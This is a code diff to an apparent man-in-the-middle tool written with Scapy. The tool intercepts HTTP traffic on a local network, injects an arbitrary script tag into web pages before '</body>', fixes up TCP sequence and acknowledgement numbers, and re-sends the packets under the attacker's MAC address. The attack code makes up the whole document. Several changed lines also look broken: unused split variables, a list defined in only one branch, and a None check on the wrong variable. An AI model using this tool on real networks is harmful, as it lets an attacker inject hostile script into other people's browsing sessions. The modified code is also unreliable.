@@ -79,7 +79,8 @@ def faketcp(packet):
         state = (packet[TCP].sport+packet[TCP].dport)
         if state not in tcpStates:
             debug(f'Initialize {packet[TCP].sport}->{packet[TCP].dport}')
-            tcpStates[state] = {'nb_more': 0, 'fin': False}
+            tcpStates[state] = {'nb_more': 0, 'fin': 0}
+
 
         if packet.haslayer(Raw):
             oldlen = len(packet[Raw].load)
@@ -96,27 +97,35 @@ def faketcp(packet):
             target = re.compile(re.escape('</body>'), re.IGNORECASE)
             script = f'<script>{args.script}</script></body>'
             load = target.sub(script, load)
+            if script in load:
+                l1, l2 = load.split(script)
+                l2 = script+l2
+            else:
+                ps = [packet]
+
+
+
             packet[Raw].load = load.encode('utf-8')
 
             len_more = len(packet[Raw].load) - oldlen
             debug(f'Len more: {len_more}')
 
-        packet.seq += tcpStates[state]['nb_more']
-        if packet[TCP].flags.A:
+        if packet[TCP].seq != 1 and packet[TCP].sport == 80:
+            packet.seq += tcpStates[state]['nb_more']
+        if packet[TCP].flags.A and packet[TCP].dport == 80:
             packet.ack -= tcpStates[state]['nb_more']
 
         if packet.haslayer(Raw):
             tcpStates[state]['nb_more'] += len_more
 
-        if tcpStates[state]['fin'] and packet[TCP].flags.F:
+        if tcpStates[state]['fin'] == 2:
             del tcpStates[state]
-            debug(f'Tear Down {packet[TCP].sport}->{packet[TCP].dport}')
-        elif packet[TCP].flags.F and packet[TCP].flags.A:
-            tcpStates[state]['fin'] = True
-            debug(
-                f'About to Tear Down {packet[TCP].sport}->{packet[TCP].dport}')
+        else:
+            flag = packet[TCP].flags
+            if flag.F:
+                tcpStates[state]['fin'] += 1
 
-        return packet
+        return [packet]
     except Exception as e:
         debug(f'Error in faketcp: {e}')
         traceback.print_exc()
@@ -132,14 +141,14 @@ def handle_packet(p):
             return
         if p[Ether].src != attackerMAC and p.haslayer(TCP):
             debug(f'Sniffed: {p.summary()}')
-            p = faketcp(p)
+            ps = faketcp(p)
+            if p == None:
+                return
 
-        # if p.haslayer(TCP):
-            # debug(f'Sniffed: {p.summary()}')
-
-        p[Ether].src = attackerMAC
-        p[Ether].dst = None
-        sendp(p, iface=conf.iface)
+        for p in ps:
+            p[Ether].src = attackerMAC
+            p[Ether].dst = None
+            sendp(p, iface=conf.iface)
     except Exception as e:
         debug(f'Error when sniffing: {e}')
         debug(f'Packet is: {p.summary()}')
